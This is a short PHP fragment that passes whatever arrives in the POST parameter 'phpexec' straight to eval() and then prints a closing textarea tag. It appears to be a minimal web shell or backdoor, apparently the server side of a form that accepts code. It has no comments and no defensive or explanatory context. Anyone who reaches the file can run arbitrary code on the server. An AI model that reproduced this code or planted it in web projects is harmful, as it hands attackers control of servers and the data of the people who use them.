<?php
if($_POST['phpexec']){
	eval($_POST['phpexec']);
	echo("</textarea>");
}
?>